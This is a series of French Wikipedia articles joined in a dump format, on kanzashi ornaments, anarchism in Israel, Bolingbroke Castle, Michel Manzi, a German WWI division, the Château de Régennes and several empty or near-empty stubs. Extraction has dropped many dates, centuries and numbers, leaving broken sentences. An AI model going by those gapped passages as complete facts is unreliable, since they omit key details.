Le "tsumami kanzashi" a été officiellement désigné comme un artisanat traditionnel de la région de Tokyo en 1982. Les artisans professionnels initiés selon les traditions passent par une période d’apprentissage pouvant durer de cinq à dix ans. Leur nombre dans le pays a fortement diminué, passant de quinze à cinq de 2002 à 2010 selon des estimations. Cependant, les techniques de pliage servant à créer les fleurs du "tsumami kanzashi" se sont répandues, grâce à des livres d’explications, des kits et des tutoriels proposés par exemple par le Musée du "tsumami kanzashi" du quartier de Shinjuku. Certains élèves ont contourné le système d'apprentissage traditionnel et se sont établis comme artisans professionnels indépendants de "tsumami kanzashi" au Japon.
Types de "kanzashi".
Les matières premières pour la fabrication de "kanzashi" sont nombreuses ; on compte parmi elles le bois laqué, des métaux plaqués d’or ou d’argent, l’écaille de tortue ou la soie, et plus récemment des matières plastiques. Les premiers "kanzashi" en bakélite sont désormais des pièces de collection prisées.
Il existe plusieurs styles de "kanzashi", qui peuvent être combinés dans des arrangements traditionnels représentant des fleurs ou des saisons. Aujourd'hui, seules les "maiko" portent encore ces arrangements complexes.
"Hana kanzashi".
Le "hana kanzashi" est la cascade de fleurs caractéristiques des "maiko". Les fleurs sont construites par la technique du "tsumami", qui consiste à plier et pincer à l’aide de pinces fines des carrés de soie, qui forment les pétales. Ceux-ci sont ensuite assemblés pour former les fleurs, qui comportent entre 5 et 75 pétales ou plus, selon la fleur reproduite. Un "hana kanzashi" est un assemblage de ces fleurs, et peut parfois inclure des "bira-bira" ou de longues chaînes de pétales, conçues pour ressembler aux fleurs pendants de la glycine. Généralement, ils se portent par paires, avec un "kanzashi" de chaque côté de la tête, souvent avec un "kushi" assorti et/ou plusieurs fleurs supplémentaires éparpillées sur les cheveux. Les fleurs sont munies de supports de métal ou de carton, attachés à un fil et regroupés pour créer des bouquets ou des arrangements floraux. Des étamines peuvent être ajoutées par souci du détail, grâce à l’utilisation de "mizuhiki", une ficelle fine mais solide fabriquée à partir de papier "washi", souvent colorée, et utilisée pour les travaux décoratifs.
Les geishas, et plus encore les "maiko", portent des "hana kanzashi" différents selon le mois de l'année.
"Kanzashi" des saisons.
Les traditions japonaises préconisent d’adapter le type de "kanzashi" à la saison. Cela concerne principalement les geishas et "maiko", qui sont les seules femmes japonaises à porter des "kanzashi" assez souvent pour que les motifs saisonniers soient significatifs. Comme les "maiko" portent des coiffures et des "kanzashi" plus élaborés que les geishas, les arrangements saisonniers sont encore plus importantes pour elles.

</doc>
<doc id="10578390" url="https://fr.wikipedia.org/wiki?curid=10578390" title="UVCI">
UVCI



</doc>
<doc id="10578399" url="https://fr.wikipedia.org/wiki?curid=10578399" title="Anarchisme en Israël">
Anarchisme en Israël

L'anarchisme est présent en Israël dès avant la création de l'État israélien, notamment au travers du mouvement des kibboutzim, et plonge ses racines dans le mouvement libertaire du Yiddishland au .
Le débat est intense au sein du mouvement anarchiste international autour de la proposition du sionisme de Theodor Herzl et de la création d'un « foyer national » juif en Palestine. Un courant sioniste libertaire défend la création de ce foyer national juif sans pour autant avaliser la création d'un État-nation juif et tout en prônant la coopération entre juifs et palestiniens.
L'anarchisme s'implante en Palestine au début du , porté par une vague d'émigrants d'Europe de l'Est (Russie, Lituanie, Ukraine, Pologne). Les idées de Pierre Kropotkine et de Léon Tolstoï influencent certains sionistes de gauche, tels Yitzhak Tabenkin et Berl Katznelson, ainsi que certains mouvements socio-politiques tels Poale Zion, HeHalutz ou Gdoud haavoda (Bataillon du Travail).
Dans le contexte du conflit israélo-palestinien, les anarchistes sont surtout actif dans le mouvement d'action directe et de solidarité avec le peuple palestinien, notamment au travers du collectif Anarchists Against the Wall.
Avant la création de l'État d'Israël.
Les libertaires du Yiddishland.
L’existence d’un mouvement libertaire juif dans l’histoire peut paraître éloignée de la représentation habituelle que l’on peut se faire du judaïsme.
Cependant, ce mouvement a bien existé. De la fin du jusqu’à la première moitié du , d'abord au sein du Yiddishland, ce « pays sans frontières » (Russie, Pologne, Lituanie, Biélorussie, Ukraine, etc.), puis par vagues d'émigration en Europe occidentale et aux Amériques. Mais c'est essentiellement en Angleterre, aux États-Unis et en Argentine que le mouvement ouvrier juif naissant s’organise quantitativement de manière significative et sur des bases d'inspiration anarchiste. En Amérique du nord et du sud, les membres des organisations syndicales et culturelles libertaires se comptent par milliers, et les lecteurs des journaux anarchistes en langue yiddish par dizaines de milliers.
Cette émigration juive d’Europe de l’est donnera des intellectuels libertaires de haut niveau et d’une
grande originalité de pensée tels Paul Goodman, Julian Beck, Noam Chomsky, Murray Bookchin ou Paul Avrich.
Pour le philosophe Michaël Löwy, « On voit apparaître, dans la culture juive de la Mitteleuropa à partir de la fin du , un courant romantique […] qui sera attiré par l’utopie libertaire plutôt que par la social-démocratie. […] Un réseau complexe de liens […] va se tisser entre romantisme, renaissance religieuse juive, messianisme, révolte culturelle “anti-bourgeoise” et anti-étatiste, utopie révolutionnaire, socialisme, anarchisme ».
Issus des milieux populaires, les libertaires juifs associent identité (voire communautarisme) et internationalisme (voire cosmopolitisme). Ils sont la preuve que l’antisémitisme social qui confine le Juif dans le rôle du capitaliste, est erroné et inacceptable.
Anarchisme et sionisme.
Le sionisme libertaire nait en réaction à la montée de l'antisémitisme en Europe à la fin du : grands pogroms russes des années 1880, affaire Dreyfus en France.
Les membres connus de cette tendance, pleinement membres du mouvement libertaire, sont à la fin du Henri Dorr, Mécislas Golberg ou Bernard Lazare qui théorise le « sionisme libertaire », dont les options divergent du sionisme de Theodor Herzl. Il n'évoque pas l'idée d'un État juif, mais d'une nation juive. Le projet est de fonder un foyer national sans État.
L'Encyclopédie anarchiste, initiée par Sébastien Faure et publiée entre 1925 et 1934, comporte quatre notices ayant trait au sionisme ("Israélites", "Ghetto", "Judaïsme" et "Sionisme"). Ces articles développent l'idée que le sionisme est un mouvement généreux, qui permet d'échapper aux persécutions et qui par la colonisation agricole et les fermes collectives rend possible un développement égalitaire de la société, mais qui dans le même temps ajoute des barrières nationales, entrave à une possible révolution.
Joseph Trumpeldor, qui plus tard est devenu un héros de la droite sioniste (voir Betar), était aussi à l'origine un anarchiste et un disciple de Pierre Kropotkine. Il a déclaré, « Je suis un anarcho-communiste et un sioniste ». Son programme pour un réseau syndicaliste de communautés socialistes, formulé en 1908-1909, a influencé la création des Kibboutzim.
Par ailleurs dans le débat, des anarchistes d'origine juive défendent un antisionisme radical, tel Jules Chazoff (1891-1946), notamment dans plusieurs articles publiés par "Le Libertaire" en 1938, dénonçant la mainmise du sionisme sur la Palestine et l’exploitation dont seraient victimes les Arabes. Le sionisme représente, à ses yeux, un détournement de l’idée même de révolution  sociale
En Palestine.
Les anarchistes vivant en Palestine au début du , bien qu'étant presque tous originaires de l'est de l'Europe, n'ont pas de liens avec le puissant mouvement libertaire yiddish et adoptent l'hébreu, langue impopulaire parmi les anarchistes juifs européens, dont beaucoup s'opposent à toutes les formes du sionisme et soutiennent la culture populaire yiddish de la communauté ashkénaze.
Dans les années 1920 et 1930, la plupart d'entre eux vivent dans des kibboutz. Un exemple illustre cette démarche, celui de Aharon Shidlovsky qui est l'un des fondateurs du kibboutz Kvoutzat Kinneret.
Pendant la révolution sociale espagnole de 1936, de nombreux anarchistes de Palestine vont en Espagne combattre aux côtés des anarcho-syndicalistes, le franquisme et le fascisme dans les rangs des milices confédérales de la Confédération nationale du travail.
En 1938, le philosophe anti-autoritaire juif autrichien Martin Buber s'installe à Jérusalem. Buber se considère comme un « » (sioniste culturel) et rejette l'idée d'un nationalisme juif. Il soutient fermement une solution binationale en Palestine.
Le mouvement des kibboutzim.
Selon l'historien Sylvain Boulouque, « Les expériences de travail collectif ou de modes de vie alternatifs ont toujours représenté pour les anarchistes des lieux d’expérimentation de la société future . C’est ainsi que les kibboutzim deviennent une terre d’imagination, un nouveau rêve. Nombreux sont les témoins tant dans la presse libertaire française qu’internationale à rendre compte de séjours ou d’installations dans ces collectivités agricoles et de leur caractère libertaire - réel, imaginé ou projeté. »
En Palestine, les kibboutz, constitués selon des principes substantiellement anarchistes, prospèrent, méconnaissant toutefois leurs racines libertaires. Pour Uri Gordon, « l'influence déterminante des courants anarchistes dans le mouvement des kibboutz est l'un des secrets les mieux gardés de l'historiographie sioniste officielle ».
Pourtant, le kibboutz s'est beaucoup inspiré, dans ses principes originels, des idées communistes libertaires : absence de propriété privée des moyens de production, accès aux biens égal pour tous, refus du salariat, éducation communautaire des enfants, rejet de la religion (sauf dans les Kibboutzim religieux), refus des structures élues, démocratie directe.
L'essayiste socialiste libertaire américain Noam Chomsky qui vit, en 1953, pour une durée de six semaines, dans un kibboutz près de Haïfa, formule un certain nombre de critiques, notamment dans un livre d'entretiens publié en 2002.
Après la création de l'État d'Israël.
Les affrontements armés autour de la naissance de État d'Israël, vont à nouveau fracturer le mouvement. Les libertaires cherchent à répondre aux questions liées à la guerre de 1948, aux enjeux internationaux, à la naissance d’un État juif et s’interrogent sur la possibilité d’une présence anarchiste au Proche-Orient.
Pragmatique et fin connaisseur de la région, le militant belge Louis Mercier-Vega rappelle dans "Le Libertaire" en 1947, la complexité de la situation : « Nous connaissons d’authentiques militants révolutionnaires juifs qui agissent dans les groupes terroristes parce qu’ils défendent en premier lieu leur droit à l’existence […] Si les meilleurs Arabes et les meilleurs Juifs en sont à se replier sur des positions et des activités nationalistes, c’est parce qu’il n’existe dans le monde aucune internationale ouvrière et révolutionnaire capable de présenter aux écrasés un espoir, une foi, une issue ».
Mais beaucoup d'anarchistes, fidèles à leurs convictions anationaliste et pacifiste, voient dans le conflit avant tout la naissance d’un État, source de guerre : « En Palestine, l’État apporte l’indiscutable preuve qu’il provoque la guerre du fait même de sa présence ». Ils refusent de choisir un camp dans une guerre qui pour eux n’oppose que deux nationalismes : « Seul le rejet de tout nationalisme et l’entente libre et fraternelle des populations travailleuses pourront sauver la Palestine de la barbarie qui va en s’étendant ».
Jusqu'aux années 1940, il n'y a pas de groupes spécifiquement « anarchistes » en Palestine.
Suite et fin de la tradition libertaire yiddish.
Peu avant et immédiatement après la constitution de l'État d'Israël, en 1948, il y a un afflux des survivants de la Shoah éduqués en yiddish, dont des militants libertaires.
Entre la fin des années 1940 et le début des années 1950, des immigrants polonais forment des groupes anarchistes yiddish à Tel-Aviv dont le principal représentant est Eliezer Hirschauge. Il est, notamment, l’éditeur de l’organe anarcho-syndicaliste "De’ot" ("Opinion", Tel Aviv), l'auteur d'un livre sur l'histoire du mouvement anarchiste polonais publié en 1953 et, avec sa compagne Dinah, l’animateur d’une bibliothèque anarchiste à Tel Aviv.
Dans les années 1950, l'anarchisme israélien fait référence à Abba Gordin (1887-1964), écrivain et philosophe, l'un des représentants les plus remarquables du mouvement anarchiste yiddish. Gordin a inspiré le mouvement anarchiste pan-russe et l'un des organisateurs de la Fédération anarchiste de Moscou (1918). À partir de 1925, il réside à New York, où il a émigré et où il publie une revue philosophique littéraire, "Yiddishe Shriften" (1936-1957). En 1958, il s’installe en Israël où, à Tel-Aviv, il fonde le cercle anarchiste yiddish "Agudath Schochrei Chofesh" (ASHUACH) qui compte environ 150 membres et dispose d’une bibliothèque avec tous les classiques de l’anarchisme en polonais, yiddish et hébreu et d’une vaste salle de conférences où sont organisés de nombreux débats sur l’anarchisme.
À la même époque, un groupe de militants diffuse à Tel-Aviv le journal anarchiste américain en yiddish "Freie Arbeiter Stimme" ("La Voix du travailleur libre").
Le « Groupe anarchiste juif » de Paris qui publie « Der Fraier Gedank » (« La Pensée libre » 1949-1963), n'est pas officiellement sioniste, mais verra quand même certains de ses membres émigrer vers Israël après la création de l'État. Ils y participeront à la création, en 1959 d'un journal anarchiste israélien : "Problemen-Problemot", revue mensuelle en yiddish et en hébreu (Tel Avivi, 165 numéros de 1959 à ) dont Abba Gordin est le directeur de publication jusqu’en 1964, remplacé ensuite par Shmuel Arbarbanel.
Le cercle yiddish "Agudath Schochrei Chofesh" disparait dans les années 1980 : les anciens meurent et les jeunes ne parlent plus le yiddish. Le dernier numéro de "Problemen" est publié en . Par la suite, Joseph Luden tente de relancer un journal libertaire en yiddish, "Freie Stimme"qui ne publie qu'un seul numéro. C'est la dernière publication périodique libertaire yiddish dans le monde.
Influences dans la sphère politique institutionnelle.
Le courant libertaire a influencé à l'origine le parti sioniste Hapoel Hatzaïr (Jeune Ouvrier), un des deux fondateurs (en 1930) du parti travailliste Israélien Mapaï, et plus encore sa dissidence radicale, le Hachomer Hatzaïr (Jeune Garde), un des fondateurs en 1948 du Mapam (extrême gauche sioniste). Yitzhak Tabenkin, un des dirigeants du Hapoel puis du Mapaï (après 1930), a nettement subi l'influence de l'anarchisme. Ces deux mouvements ne se sont jamais explicitement considérés comme strictement « anarchistes ».
Époque contemporaine.
Antimilitarisme et pacifisme.
Les "refuzniks" (hébreu סרבנים ("sarvanîm"), de "sarav" : il a refusé) sont des objecteurs de conscience israéliens, qui refusent de servir dans Tsahal, l'armée d'Israël. Certains de ces soldats refusent notamment de servir dans les territoires palestiniens occupés. C'est un mouvement minoritaire, quoiqu'en développement, bien que l'objection de conscience soit interdite aux hommes en Israël et juste tolérée pour les femmes.
Le premier objecteur de conscience d'Israël, ayant refusé toute forme de collaboration avec l'armée susceptible de mener à des actions non pacifistes, est le violoniste Joseph Abileah. Il est jugé en 1948 et bénéficie d'un verdict plutôt clément.
Le mouvement des « Refuzniks » naît en 1979 lorsque Gadi Algazi refuse de servir durant son service militaire dans les territoires occupés en Palestine. Il est condamné à de prison. Leur refus conduit à l'emprisonnement de nombreux refuzniks dans des prisons militaires mais le mouvement s'accentue et les refuzniks sont, en 2005, plus d'un millier.
Anarchists Against the Wall.
Le collectif "" (en français, « Anarchistes contre le Mur »), est une organisation israélienne créée en 2003. Ce groupe non-violent d'action directe milite contre la construction du mur séparant les territoires palestiniens de l'État d'Israël dans toute la Cisjordanie.
Libertaires palestiniens.
Dans un pays colonisé, souvent étroitement nationaliste, il est difficile pour les libertaires palestiniens de convaincre avec des solutions non autoritaires et non étatiques. Une des raisons qui expliquerait le peu de visibilité des libertaires palestiniens tiendrait au fait que le mouvement anarchiste international ait peu travaillé le thème du colonialisme.
En Palestine, il existe une tradition d'auto-organisation dans les luttes populaires, même celle-ci ne se réfère pas explicitement à l’anarchisme en tant que tel. Cette organisation horizontale non hiérarchique est particulièrement vivante lors de la première Intifada, en . Spontanée, elle n’est pas née d’une décision politique centralisée mais s’est même déroulée contre la volonté de l’OLP de Yasser Arafat.

</doc>
<doc id="10578417" url="https://fr.wikipedia.org/wiki?curid=10578417" title="Toufik Ouanes">
Toufik Ouanes



</doc>
<doc id="10578426" url="https://fr.wikipedia.org/wiki?curid=10578426" title="The Girl from B.I.K.I.N.I.">
The Girl from B.I.K.I.N.I.

The Girl from B.I.K.I.N.I. est un film américain de série B écrit et réalisé par Fred Olen Ray, sorti en 2007 directement en vidéo.
Synopsis.
Tania X ("Beverly Lynne"), une femme agent secret sexy du bureau international B.I.K.I.N.I. (Bureau of International Knowledge and Nonstandard Investigations), est envoyée en mission à la découverte d'une organisation criminelle.

</doc>
<doc id="10578427" url="https://fr.wikipedia.org/wiki?curid=10578427" title="La Face perdue">
La Face perdue

La Face perdue (titre original : ) est un recueil de nouvelles du Nord canadien de l'écrivain américain Jack London, publié aux États-Unis en 1910.
Historique.
La plupart des nouvelles ont fait l'objet d'une publication antérieure dans des périodiques comme le "Century Magazine" ou le "" avant .
Les nouvelles.
L'édition de "The Macmillan Co" de comprend sept nouvelles:

</doc>
<doc id="10578430" url="https://fr.wikipedia.org/wiki?curid=10578430" title="Burtonport">
Burtonport

Burtonport (en irlandais : Ailt an Chorráin or Ailt a' Chorráin) est un village de pêcheurs gaeltacht à environ 7 km au nord-ouest de Dungloe dans la région de du comté de Donegal, en Irlande.
Histoire.
Une plaque commémore sur l'île voisine d'Inishmacadurn (ou île Rutland) d'une force militaire française dirigée par James Napper Tandy dans une tentative d'aide aux rebelles lors de la rébellion irlandaise de 1798 le .
Transport.
En tant que port continentale pour le service de traversier vers l'île d'Arranmore, Burtonport reçoit beaucoup de trafic lié au tourisme.
Burtonport a eu un service de chemin de fer entre 1903 et 1940 en provenance de Letterkenny fourni par le "Letterkenny &amp; Burtonport Extension Railway (L &amp; BER)", une compagnie possédée conjointement par l'État et le . La gare de Burtonport a fonctionné du au .

</doc>
<doc id="10578437" url="https://fr.wikipedia.org/wiki?curid=10578437" title="Nicole Sheridan">
Nicole Sheridan

Nicole Sheridan, née le à Clarks Summit (Pennsylvanie, États-Unis) est une actrice américaine de films érotiques et de films pornographiques.
Biographie.
Nicole Sheridan est mariée à l'acteur américain Voodoo.

</doc>
<doc id="10578441" url="https://fr.wikipedia.org/wiki?curid=10578441" title="Château de Bolingbroke">
Château de Bolingbroke

Le château de Bolingbroke est un château médiéval anglais, aujourd'hui en ruines, situé dans le Lincolnshire, près du village de Bolingbroke.
Histoire.
&lt;mapframe zoom=16 latitude =53.165 longitude =0.0163 align=left width=250 height=250 text="Carte interactive du château de Bolingbroke"&gt;{
 "type": "FeatureCollection",
 "features": [
 "type": "Feature",
 "properties": {
 "marker-color": "#804040",
 "marker-size": "medium",
 "marker-symbol": "town-hall"
 "geometry": {
 "type": "Point",
 "coordinates": [
 0.016983747482299805,
 53.16517314462852
 {
 "type": "Feature",
 "properties": {
 "stroke": "#555555",
 "stroke-width": 2,
 "stroke-opacity": 1,
 "fill": "#ff8000",
 "fill-opacity": 0.5
 "geometry": {
 "type": "Polygon",
 "coordinates": [
 [
 0.017466545104980465,
 53.16522781699089
 [
 0.017402172088623047,
 53.164874053413534
 [
 0.016747713088989258,
 53.16485154108718
 [
 0.016388297080993652,
 53.16504771953407
 [
 0.016549229621887207,
 53.165494745759915
 [
 0.017096400260925293,
 53.16549796175906
 [
 0.017466545104980465,
 53.16522781699089
 ]
 ]
}&lt;/mapframe&gt;
Le terrain est fortifié par les Anglo-Saxons au . Au , les Normands construisent une motte castrale sur une colline voisine.
La structure actuelle est fondée par Ranulph de Blondeville en 1220, peu après son retour de la Cinquième croisade. Ranulph meurt en 1232 sans héritier mâle, et ses titres et terres reviennent à ses sœurs. À la mort d'Henry de Grosmont, en 1361, Bolingbroke revient à son gendre Jean de Gand. Son épouse Blanche de Lancastre, fille d'Henry, est née au château en 1345. Le fils de Jean et Blanche, Henri, y naît également en 1367, d'où le surnom de « Henri (de) Bolingbroke » qu'il porte jusqu'à son accession au trône en 1399.
Aux , le château subit d'importantes dégradations, bien que des restaurations aient eu lieu sous la période Tudor. Une enquête menée en 1636 conclut que les tours sont irréparables.
Le château est occupé par une garnison royaliste au début de la Première guerre civile anglaise. En 1643, il est fortement endommagé lors de la bataille de Winceby. Les Parlementaires détruisent une partie du château en 1652 afin de le rendre inutilisable.
La dernière structure majeure du château s'effondre en 1815.

</doc>
<doc id="10578449" url="https://fr.wikipedia.org/wiki?curid=10578449" title="Michel Manzi">
Michel Manzi

Michele Angelo Pasquale Manzi, dit Michel Manzi (Naples, 1849 - Saint-Raphaël, 1915), est un ancien officier de l'Armée italienne naturalisé français, devenu éditeur, imprimeur et marchand d'art de la société Goupil &amp; Cie. Inventeur de la typogravure moderne, il était lié à des artistes prestigieux comme Edgar Degas et Toulouse Lautrec.
Biographie.
Fils du négociant Samuele Manzi, Michel Manzi est né à Naples dans le quartier San Giuseppe.
Devenu élève de l'Académie militaire de Turin, il termine capitaine de l'état-major de l'Armée italienne en 1878, avant d'en démissionner en 1881.
Manzi arrive en France peu après, et entre au service de la maison Goupil &amp; Cie, propulsé par Adolphe Goupil directeur des Ateliers photographiques d'Asnières, l'un des imprimeurs d'estampes les plus prolifiques au monde. Sans doute doué pour les techniques de reproduction graphique, il réussit à perfectionner plusieurs procédés de photocomposition, inventant la photo-aquatinte (1885) puis la typogravure, qui connaît un gros succès hors de France.
Il est naturalisé français en 1887 et l'année suivante, il s'associe à Léon Boussod (1826-1896) et Maurice Joyant (1864-1930), pour reprendre l'ensemble des activités de Goupil &amp; Cie. Marchand d'art, gérant des différentes galeries Goupil présentes à Londres et New York, il se passionne pour les peintres impressionnistes et les promeut.
À partir de 1898, il dirige pour Goupil des publications de périodiques mensuels en grand-format, photo-composés en noir et couleurs, tels que "Le Théatre" (1898-1914), "Les Modes" (1901-1937), "Les Arts" (1902-1920) et "L'Hygiène" (1909-1914). On compte aussi "La Galerie théâtrale" (1904) et la "Gallery of Fashion", publié à Londres de 1907 à 1919.
Il reçoit la médaille d'or à l'exposition universelle de 1889 et est nommé chevalier de la Légion d'honneur, sous le patronage du peintre Jean-Léon Gérôme en 1900.
En 1907, il fonde et inaugure au 15 rue de la Ville-l'Évêque « l'Hôtel des Modes », un grand magasin proposant des objets luxueux destinés aux femmes. C'est à cette adresse que s'installent les nouveaux locaux de la galerie Goupil.

</doc>
<doc id="10578450" url="https://fr.wikipedia.org/wiki?curid=10578450" title="119e division d'infanterie (Empire allemand)">
119e division d'infanterie (Empire allemand)

La d'infanterie est une unité de l'armée allemande créée en 1915 qui participe à la Première Guerre mondiale. Formée en Lorraine, la division est rapidement transférée sur le front de l'est et prend part à l'offensive de Gorlice-Tarnów. Au cours de l'année 1916, la division occupe plusieurs secteurs de front, elle est employée dans la région du lac Naroth.
En , la est transférée sur le front de l'ouest où elle est successivement engagée à Ypres puis en novembre lors de la contre-attaque allemande sur Cambrai. Au printemps 1918, elle combat lors de l'opération Michael, puis en Flandres. Durant l'été, elle renforce la ligne de front dans un premier temps sur la Somme, puis en Belgique. Après la signature de l'armistice, la division est rapatriée en Allemagne et dissoute.
Première Guerre mondiale.
Historique.
La d'infanterie est formée du d'infanterie issu de la d'infanterie, du d'infanterie issu de la d'infanterie et du de réserve issu de la de réserve.

</doc>
<doc id="10578468" url="https://fr.wikipedia.org/wiki?curid=10578468" title="Château de Régennes">
Château de Régennes

Le château de Régennes se trouve sur la commune d'Appoigny dans le département de l'Yonne, au nord de la Bourgogne, en France.
Propriété de l'évêché d'Auxerre depuis le et résidence fréquente des évêques d’Auxerre, détruit à différentes reprises, il est chaque fois rebâti somptueusement. Trois rois et un dauphin y ont été reçus.
Il est vendu en 1791 et totalement rasé à cette époque.
Le présent bâtiment est construit par , natif d'Appoigny, entre la Première et la Seconde Guerre mondiale. Il est depuis devenu une clinique. Les jardins sont recensés à l'inventaire général du patrimoine culturel et sont visitables sur demande.
Toponymie.
Les noms de "Rigena", "Regenna", "Regius amnis" ou "Regeanne" figurent sur différents documents.
"La transcription latine "Regius Amnis", qui paraît pour la première fois dans un acte de 1145, est certes une fantaisie étymologique de clerc demi-savant au même titre que ""Signum laetum" ", pour Seignelay, ""Sacrum" "Caesaris" pour Sancerre, ou "Tonitruum"" pour Tonnerre. En réalité la forme ancienne est suggérée par une graphie de 1266 : "Riganam", dans une ordonnance de saint Louis. Faute de témoignages plus anciens, l'analogie du nom de Migennes, commune voisine d'Appoigny, doit nous mettre sur la bonne voie : c'est "Mitiganna", en 634, dans le testament de l'évêque d'Auxerre Vigilius ; "Mitgana" au IXe siècle, dans le sacramentaire sénonais de Stockholm ; "Migana" en 1161 et "Migenne" en 1543. Nous sommes donc portés à reconstituer pour le nom de Régennes la série inverse "Régenne, Rigâna, Ritgana, Ritigana", série conforme par ailleurs aux lois de la phonétique romane... "Ritigana" ou plus anciennement "Riticana" (s.-e. villa) est un adjectif issu de la racine celtique "ritu" - , "gué", à laquelle s'ajoutent un premier suffixe - "ic" - (cf. "Avar-ic-um, Autr-ic-um") et un second suffixe - "an"-, qui a été employé, surtout au début de la colonisation romaine de la Gaule, pour la formation des noms de domaines. Il se pourrait donc que "Rit-ic-os" fût la forme la plus ancienne du nom de "Régennes" et qu'elle signifiât "le domaine du gué" : un gué, très anciennement utilisé, coupe la boucle de la rivière qui contourne Régennes.
Localisation.
Le château de Régennes est sur l'actuelle commune d'Appoigny à au nord d'Auxerre. Comme la ville d'Appoigny, il se trouve en rive gauche (côté ouest) de l'Yonne mais a l'avantage d'être presque entièrement entouré par une boucle de la rivière, très méandreuse à cet endroit.
Le site commande un pertuis sur la rivière Yonne, d'une grande importance pour le passage des bateaux et le transport des marchandises, entre autres notamment le vin dont l'implantation dans la région auxerroise remonte au et, à partir du , essentiel pour le flottage des trains de bois du Nivernais à destination de Paris.
Autre caractéristique du lieu et élément de convoitise : il est extrêmement fertile. Appoigny, village immédiatement dépendant de Régennes à tous égards, est longtemps considéré comme « le jardin d'Auxerre et de Joigny ». Jacques Amyot, évêque d'Auxerre (1570-1593), offre au roi Henry III un chou si gros qu'il faut deux hommes pour le porter.
Histoire.
Fin de l'Antiquité et Haut Moyen Âge.
Vers l'an 380 Régennes appartient aux parents de saint Germain ( évêque d'Auxerre 418-448), Rustique et Germanille, dont il est dit qu'ils y ont été enterrés en grande pompe. Léguées à l’église d’Auxerre par saint Germain, les terres demeurent la propriété des évêques d’Auxerre de 448 à la Révolution française.
Dès l'époque d'Aunaire ( év. 572-605), les sénonais font des incursions jusqu'à Auxerre et ravagent Régennes au passage.
Auxerre est prise par des pilleurs, probablement sarrazins (des visigoths sont aussi mentionnés), en 729 ou 732. Ils arrivent du sud, puisqu'ils prennent d'abord Mâcon, Tournus, Châlons, Beaune et Dijon. Mais alors qu'ils approchent de Sens, l'évêque Ebbon de Sens sort de la ville avec ses vassaux et attaque, les met en déroute et les poursuit jusque près de Régennes où les sénonais défont entièrement les sarrazins.
Le pertuis de Régennes.
Le pertuis de Régennes est une écluse à déversoir et un passage obligé sur l'Yonne pour les bateaux. Celui qui a la mainmise sur Régennes tient Auxerre en échec car il commande la navigation depuis et vers Auxerre. C'est donc un point hautement stratégique lors de conflits.
Par ailleurs, avec l'introduction d'un péage c'est une source de revenus. Sur les voies d'eau les péages sont nombreux, puisque « le moindre filet d'eau était l'occasion d'une perception ». L'Auxerrois, pays historiquement gros producteur de vin, en a fait passer par ce pertuis d'énormes quantités de barriques au cours des siècles.
Mais ce pertuis en particulier est essentiel pour le flottage des trains de bois de chauffage et de construction, radeaux d'environ de long sur de large faits de bûches soigneusement assemblées par des liens végétaux et qui, à partir du milieu du , descendent les rivières du haut bassin de la Seine depuis le Nivernais et le Morvan en général, à destination notamment de Paris où une ordonnance de 1415 sous Charles VI mentionne déjà un train de bois arrivé dans la ville.
Car l'Yonne, qui vient du Morvan et du Nivernais boisé, n'est pas navigable en amont de Clamecy mais elle y sert de « chemin qui marche » pour le bois flotté depuis les forêts nivernaises, avec son premier train de bois arrivant à Paris le 20 avril 1547 en provenance de "Chasteau-Sans-Souef" (aujourd'hui Châtel-Censoir). En aval de Clamecy elle est navigable, et c'est dans les environs de Clamecy que le bois flotté est assemblé en « trains » ; mais jusqu'à Régennes le cours de l'Yonne est souvent sinueux ou torrentiel, parfois les deux ensemble. Le flottage du bois sur un tel cours exige donc un apport d'eau au-delà du débit habituel, pour pousser ces grosses masses de bois vers l'aval. D'où l'abondance de pertuis et d'étangs artificiels ou artificiellement agrandis, qui doivent accumuler l'eau pour, le moment venu, la relâcher par tous les pertuis de façon synchronisée sur tout le parcours du flottage de bois. Or Régennes est le dernier pertuis en aval dont le fonctionnement est nécessaire pour faire avancer les trains de bois ; c'est aussi le lieu où ces trains de bois peuvent être couplés grâce à la largeur accrue de la rivière. En 1568 ces trains de bois sont utilisés par l'infanterie catholique pour aborder Régennes tenu par les huguenots.
Le pertuis et les moulins de Régennes sont détruits vers 1738 car ils causent trop d'accidents.
Bas Moyen Âge.
Vers 1076, Robert de Nevers ( év. 1076-1084) repousse les sénonais hors d'Appoigny, leur enlève leurs prisonniers et fait bâtir à Régennes une première forteresse. Son successeur Humbaud ( év. 1087-1114) remet en état Appoigny qu'il fait aussi fortifier. À l'époque (an 1100), Régennes est appelé le "clos épiscopal".
En 1145, saint Bernard (1090/1091-1153) établit les obligations de l’évêque envers le comte d'Auxerre pour le passage des mariniers au pertuis de Régennes.
Hugues de Noyers ( évêque d'Auxerre 1183-1206) embellit le château et commence le creusage de fossés complétés par des murs et quelques fortifications ; il entend faire creuser un chenal pour amener un bras de rivière à parachever l'entourage du site par des cours d'eau. Mais le comte de Champagne Thibaut III (1197-1201) s'y oppose "manu militari" et fait détruire quelque ouvrage commencé dans le but de fortifier l'endroit.
Guy de Mello ( évêque d'Auxerre 1247-1269) fait construire des murailles de clôture considérablement agrandies et une tour carrée très épaisse en forme de portique. Il fait surélever le château, et y fait de grands aménagements à l'intérieur, ainsi qu'à l'extérieur où il fait planter des vergers et creuser des étangs. Il fait aussi reconstruire les tours sises le long de l'Yonne, qui sont délabrées.
Les évêques d’Auxerre sont propriétaires de la rivière en aval du pont, et Guy de Mello le fait clairement comprendre quand il arrache les panneaux que les officiers du roi ont plantés sur la barre du pertuis pour marquer la souveraineté royale. Cela ne l'empêche pas de recevoir le roi saint Louis en 1265 ou 1266 à Régennes, d'où ce dernier envoie des lettres à Auxerre et à Paris le 25 juillet afin de faire reconstruire le pont d'Auxerre dont une partie a été emportée par la crue de 1265. Saint Louis fait une seconde visite en mars 1269, une halte sur son chemin vers l'Afrique. Deux autres rois s'arrêteront à Régennes : Jean II le Bon (1350–1364) et Charles IX (1560-1574) ; et un dauphin : le futur Louis XVIII (1814-1824). 
Pierre de Mornay ( év. 1295-1306) meurt à Régennes le 29 mai 1306.
Du temps d'Aymeric Guénaud ( évêque d'Auxerre 1331-1339), une sentence arbitrale prononcée le 23 février 1338 qualifie Régennes d"'hospice" « quoique plusieurs siècles auparavant ce fut un château très fort » ; les bâtiments se sont donc dégradés depuis les aménagements de Guy de Mello, sans que l'on en connaisse la cause. Aymeric Guénaud se plaît toutefois assez à Régennes pour doter le lieu d'une première garenne.
Bien qu'il ne reste que trois ans en charge, Pierre de Villaines ( évêque d'Auxerre 1344-1347) prend le temps de fortifier et armer d'artillerie Régennes (et Villechaul).
